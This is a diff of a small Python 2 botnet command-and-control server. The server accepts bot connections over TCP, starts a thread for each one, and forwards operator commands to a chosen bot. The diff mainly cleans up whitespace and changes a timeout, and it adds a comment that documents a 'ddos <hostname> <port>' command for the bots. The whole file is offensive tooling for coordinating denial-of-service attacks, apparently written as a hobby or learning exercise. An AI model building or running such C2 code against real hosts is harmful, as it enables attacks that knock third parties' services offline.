@@ -2,10 +2,14 @@
 
 import socket, threading
 import string
-import sys 
-import select 
-import tty 
+import sys
+import select
+import tty
 import termios
+
+#________COMMANDS________
+#Enter command in format <botnumber> <command> <command_args>
+#   -DDOS: <botnumber> ddos <hostname> <port>//ddos_test_server is localhost port 12345
 
 
 class Bot(threading.Thread):
@@ -19,15 +23,15 @@ class Bot(threading.Thread):
         print "[+] New thread started for "+ip+":"+str(port)
 
 
-    def run(self):                  # SERVER SIDE RECEIVE               
+    def run(self):                  # SERVER SIDE RECEIVE
                                     # these threads will be running parallely
                                     #so server can use whatever any bot sends to it
 
         data= "dummy"
-        while len(data):                            
+        while len(data):
             data = clientsock.recv(2048)
-         #   print "Client sent : "+data           
-          
+         #   print "Client sent : "+data
+
         print "Client disconnected..."
 
 host = "0.0.0.0"
@@ -43,17 +47,17 @@ threads = []
 
 while True:
     tcpsock.listen(4)
-    tcpsock.settimeout(1)
+    tcpsock.settimeout(None)
 
     print "\nListening for incoming connections..."
     (clientsock, (ip, port)) = tcpsock.accept()
-    
+
     newthread =  (Bot)(ip, port,clientsock, num_bots)  # new thread for each socket
     Bot_array.append(newthread)                                 #each bot in an array
     num_bots+=1
     newthread.start()
     threads.append(newthread)
-    command= raw_input("Enter command in format <botnumber> <command>:") 
+    command= raw_input("Enter command in format <botnumber> <command>:")
     if(command[0].isdigit() and int(command[0])<num_bots ):     # if there isnt a number in the beginning it won't send to any socket
         Bot_array[int(command[0])].socket.send(command)         #send command to whichever bot you specify
 for t in threads:
